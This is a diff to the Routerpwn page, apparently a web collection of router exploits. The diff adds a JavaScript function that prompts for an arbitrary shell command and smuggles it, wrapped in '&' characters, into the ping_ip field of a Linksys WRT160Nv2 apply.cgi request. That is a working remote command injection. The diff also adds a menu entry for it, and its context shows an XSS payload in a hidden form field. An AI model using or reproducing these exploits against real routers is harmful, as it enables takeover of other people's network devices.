@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.13.193</title>
+		<title>Routerpwn 1.13.195</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link REL="SHORTCUT ICON" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -249,7 +249,22 @@ function x3000_command(ip)
 	post('http://' + ip + '/apply.cgi', form);
 }
 
-
+function wrt160nv2_command(ip)
+{
+	ip = ip || "192.168.1.1";
+	cmd = prompt("Command:");
+	var form = '<input	type="hidden"	name="submit_button" value="Diagnostics"/>';
+	form += '<input	type="hidden"	name="change_action"	value="gozila_cgi"/>';
+	form += '<input	type="hidden"	name="submit_type"	value="start_ping"/>';
+	form += '<input	type="hidden"	name="action"	value=""/>';
+	form += '<input	type="hidden"	name="commit"	value="0"/>';
+	form += '<input	type="hidden"	name="ping_ip"	value="%26"' + encodeURI(cmd);
+	form += '%26"/><input	type="hidden"	name="ping_size" value=""/>';
+	form += '<input	type="hidden"	name="ping_times"	value="5"/>';
+	form += '<input	type="hidden"	name="traceroute_ip"	value=""/>';
+	form += '</form>';
+	post('http://' + ip + '/apply.cgi', form);
+}
 
 function freeboxdosr() {
 	ip=prompt("IP:");
@@ -2279,7 +2294,15 @@ a=a+1
 <input type="hidden" name="submit_button" value="%27%3balert(%22i CaN hAZ XSS by G42%22)%3b//&"/>
 </form>
 <h2>Cisco Linksys</h2>
-<h3><a href="javascript:img('Linksys EA2700')">Linksys EA2700</a>, <a href="javascript:img('Linksys WRT54G')">Linksys WRT54G</a>, <a href="javascript:img('WAG120N')">WAG120N, <a href="javascript:img('Linksys X3000')">Linksys X3000</a></h3>
+<h3><a href="javascript:img('Linksys EA2700')">Linksys EA2700</a>, <a href="javascript:img('Linksys WRT54G')">Linksys WRT54G</a>, <a href="javascript:img('WAG120N')">WAG120N, <a href="javascript:img('Linksys X3000')">Linksys X3000, <a href="javascript:img('Linksys X3000')">Linksys X3000</a></h3>
+
+<article>
+	<div>21/05/13</div>
+	<div><a href="http://www.exploit-db.com/exploits/25608/">[+]</a></div>
+	<div><a href="javascript:wrt160nv2_command()">Linksys WRT160nv2 - apply.cgi Remote Command Injection</a></div>
+	<div><a href="javascript:wrt160nv2_command(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
 
 <article>
 	<div>22/06/13</div>
